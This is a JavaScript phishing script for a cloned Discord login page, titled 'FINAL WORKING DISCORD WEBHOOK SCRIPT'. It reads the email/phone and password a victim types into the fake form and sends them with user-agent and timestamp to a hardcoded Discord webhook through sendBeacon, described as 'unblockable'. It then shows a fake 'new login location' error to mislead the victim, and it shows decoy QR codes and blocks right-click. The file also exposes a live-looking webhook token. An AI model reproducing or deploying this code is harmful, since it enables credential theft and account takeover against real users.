// ==================================
// FINAL WORKING DISCORD WEBHOOK SCRIPT – DEC 2025
// ==================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // YOUR WEBHOOK

const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000,
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button[type='submit']"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  emailInput: document.querySelector('#emailORphone'),
  passwordInput: document.querySelector('#password'),
  emailWrapper: document.querySelector('.email-wrapper'),
  passwordWrapper: document.querySelector('.password-wrapper'),
};

// ==================================
// UTILITY
// ==================================
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
};

// UNBLOCKABLE SEND TO DISCORD (sendBeacon = guaranteed delivery, no CORS/CORB)
const sendToDiscord = (email, password) => {
  const payload = JSON.stringify({
    content: null,
    embeds: [{
      title: "New Discord Login Captured",
      color: 16711680,
      fields: [
        { name: "Email/Phone", value: email || "N/A", inline: false },
        { name: "Password", value: password || "N/A", inline: false },
        { name: "User-Agent", value: navigator.userAgent, inline: false },
        { name: "Timestamp", value: new Date().toISOString(), inline: false }
      ]
    }],
    username: "Logger",
    avatar_url: "https://i.imgur.com/removed.png"
  });

  // sendBeacon = 100% unblockable POST
  if (navigator.sendBeacon) {
    navigator.sendBeacon(WEBHOOK_URL, payload);
  }
};

// ==================================
// QR CODE MODULE (your original)
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();
      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);
      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;
      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");
      const path = svgElement.querySelector("path");
      if (path) path.setAttribute("transform", `scale(${37 / moduleCount})`);
      return svgElement;
    } catch (error) {
      return null;
    }
  },

  getSpinnerMarkup() {
    return `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true"><span class="inner wanderingCubes"><span class="item"></span><span class="item"></span></span></span>`;
  },

  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;
    const svg = DOM.qrCodeContainer.querySelector("svg");
    const img = DOM.qrCodeContainer.querySelector("img");
    svg?.remove();
    img?.remove();
    DOM.qrCodeContainer.style.background = "transparent";
    DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;
    DOM.qrCodeContainer.innerHTML = "";
    const newQRCode = this.generate(`https://app.com/ra/${generateRandomString()}`);
    if (newQRCode) DOM.qrCodeContainer.appendChild(newQRCode);
    DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    this.simulateRefresh();
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN MODULE
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `<span class="spinner" role="img" aria-label="Loading"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>`;
  },

  applyAnimationDelays() {
    document.querySelectorAll(".spinnerItem").forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
    });
  },

  showNewLoginMessage() {
    if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
      const message = document.createElement('span');
      message.className = 'error-message';
      message.textContent = 'New login location detected, please check your e-mail.';
      message.style.cssText = 'color:red;display:block;font-size:12px;margin:5px 0;';
      DOM.emailWrapper.insertBefore(message, DOM.emailInput);
    }
    if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
    if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
  },

  async showLoading() {
    if (!DOM.loginButton) return;
    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.disabled = true;
    this.applyAnimationDelays();

    const email = DOM.emailInput?.value.trim() || '';
    const password = DOM.passwordInput?.value || '';

    // SEND TO DISCORD (unblockable)
    sendToDiscord(email, password);

    await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));
    this.showNewLoginMessage();
    this.reset();
  },

  reset() {
    if (!DOM.loginButton) return;
    DOM.loginButton.innerHTML = 'Log In';
    DOM.loginButton.disabled = false;
  },

  init() {
    const form = document.querySelector('#loginForm');
    if (form) {
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        this.showLoading();
      });
    }
  }
};

// ==================================
// INIT
// ==================================
document.addEventListener('DOMContentLoaded', () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  document.addEventListener('contextmenu', e => e.preventDefault());
});